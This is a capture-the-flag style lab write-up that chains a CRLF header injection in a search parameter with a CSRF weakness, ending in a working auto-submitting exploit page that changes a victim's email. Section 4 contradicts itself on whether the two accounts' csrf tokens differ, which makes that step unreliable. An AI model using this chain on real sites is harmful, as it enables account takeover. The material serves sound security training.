# CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack:

- `wiener:peter`
- `carlos:montoya`

---

## 1. Setup

- Clicked `ACCESS THE LAB` and ran the following script in the background to keep the lab alive during idle time:

```python
import requests
try:
    while True:
        check = requests.get("https://0a1e0008036cd24080c04ef6002600a6.web-security-academy.net/")
        print(f"Status code: {check.status_code}")
except KeyboardInterrupt:
    print("[x] Bye."); import sys; sys.exit(1)
```

- Logged in as `wiener:peter` and landed on `/my-account?id=wiener`.

---

## 2. Analysing the Email Change Request

- Changed the email to `test@test.com` and captured the request in BurpSuite:

```http
POST /my-account/change-email HTTP/2
Host: 0a1e0008036cd24080c04ef6002600a6.web-security-academy.net
Cookie: csrfKey=iputbZBF8WURiii2mBwCZIfU8VoRcGhm; session=9BawIFPzz6o25gYpEL3T4VVamUiGYc0H
Content-Length: 59
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a1e0008036cd24080c04ef6002600a6.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1e0008036cd24080c04ef6002600a6.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

email=test%40test.com&csrf=LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
```

- Noticed two interesting things:
  - A `csrf` parameter in the POST body (as usual).
  - An additional `csrfKey` value being sent as a **separate cookie**, alongside the normal `session` cookie.

---

## 3. Probing the Token Validation

- Removed the `csrf` parameter entirely — got `400 Bad Request: "Invalid CSRF token"`. The backend pseudo code likely looks like:

```javascript
const { email, csrf } = request.body;
if (!email || !csrf) {
    return res.status(400).json({ message: "Invalid CSRF token" });
}
```

- Kept the `csrf` parameter but changed it to a random 32-character string — also `400`. So the server validates that the token is real, not just present.
- Tried modifying the `csrfKey` cookie value — same `400` response. Both the cookie and the body parameter are validated together.

---

## 4. Checking if the Token is Session-Bound

- Logged into the second account (`carlos:montoya`) in a separate private window and captured the same email change request:

```http
POST /my-account/change-email HTTP/2
Host: 0a1e0008036cd24080c04ef6002600a6.web-security-academy.net
Cookie: csrfKey=iputbZBF8WURiii2mBwCZIfU8VoRcGhm; session=miZm4tpu7glqnuxhDo0jyknwkqaqWy5o

email=hello%40hello.com&csrf=04UDuNLjaQPHt0C4rKUkEJyVFCxEDhrD
```

- Noticed the `csrfKey` cookie was **identical** across both accounts (`iputbZBF8WURiii2mBwCZIfU8VoRcGhm`), but the `csrf` body parameter was different between them.
- Checked if the `csrf` body token was static per session by reading it from the DOM across multiple page refreshes for both accounts:

```javascript
document.getElementsByName('csrf').item(0).value
```

```
wiener:
1. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
2. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
3. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
4. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
5. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS

carlos:
1. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
2. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
3. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
4. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
5. LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS
```

- The `csrf` body token was the same across both users and all page refreshes — meaning the `csrf` token is tied to the `csrfKey` cookie, not to the `session` cookie. This was confirmed by swapping `wiener`'s `csrfKey` cookie and `csrf` token into `carlos`'s request in Repeater — the server accepted it.

---

## 5. Discovering the CRLF Injection

- While exploring the application further, found the search functionality sets a `LastSearchTerm` cookie reflecting the user's input directly into the `Set-Cookie` response header:

```http
GET /?search=hello HTTP/2
```

```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=hello; Secure; HttpOnly
```

- Tested for CRLF injection by injecting `%0d%0a` (URL-encoded `\r\n`) followed by a fake header into the search term:

```
GET /?search=hello%0d%0aX-Header:+true
```

- Got back:

```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=hello
X-Header: true; Secure; HttpOnly
```

- The injected `\r\n` broke out of the `Set-Cookie` value and inserted a new response header, confirming CRLF injection. This meant arbitrary response headers — including `Set-Cookie` directives — could be injected via the search parameter.

---

## 6. Chaining CRLF + CSRF

- The attack plan: use the CRLF injection to plant `wiener`'s `csrfKey` cookie into the victim's browser via a forged `Set-Cookie` header, then submit the email change form using `wiener`'s matching `csrf` body token. Since the server only checks that the `csrfKey` cookie matches the `csrf` body token (not that either one belongs to the victim's session), this gives full CSRF control.
- Crafted the final exploit payload:

```html
<html>
   <form enctype="application/x-www-form-urlencoded" action="https://0a1e0008036cd24080c04ef6002600a6.web-security-academy.net/my-account/change-email" method="POST">
      <table>
         <tr>
            <td>email</td>
            <td><input type="text" value="attacker@attacker.com" name="email"></td>
         </tr>
         <tr>
            <td>csrf</td>
            <td><input type="text" value="LCQH2nKBjBGGSMfyl3OPTl7OkzYNeLeS" name="csrf"></td>
         </tr>
      </table>
   </form>
   <img src="https://0a1e0008036cd24080c04ef6002600a6.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=iputbZBF8WURiii2mBwCZIfU8VoRcGhm%3b%20SameSite=None" onerror="document.forms[0].submit()">
</html>
```

- Breaking down what happens when the victim loads this page:
  1. The browser requests the `<img>` src — a search request to the lab with a CRLF-injected `Set-Cookie` header that plants `wiener`'s `csrfKey` cookie into the victim's browser with `SameSite=None`.
  2. The image fails to load (it's not an actual image), triggering the `onerror` handler.
  3. `onerror` fires `document.forms[0].submit()`, which POSTs the email change form with `wiener`'s `csrf` body token.
  4. The server now receives a request where the `csrfKey` cookie matches the `csrf` body token — exactly as it expects — and processes the email change.

> **Why this works:** The server validates CSRF by checking that the `csrfKey` cookie and the `csrf` body parameter match each other, but neither is tied to the user's actual `session` cookie. An attacker who can inject a `Set-Cookie` header into the victim's browser (via the CRLF vulnerability in the search endpoint) can plant their own known `csrfKey` value, then supply the matching `csrf` token in the forged form body — making the server's CSRF check pass completely, all without ever touching the victim's session.

---

## 7. Solve the Challenge

- Hosted the payload on the exploit server and delivered it to the victim.
- The CRLF injection planted `wiener`'s `csrfKey` into the victim's browser; the form auto-submitted with the matching `csrf` token; the server accepted the request and changed the victim's email to `attacker@attacker.com`.
- Lab solved.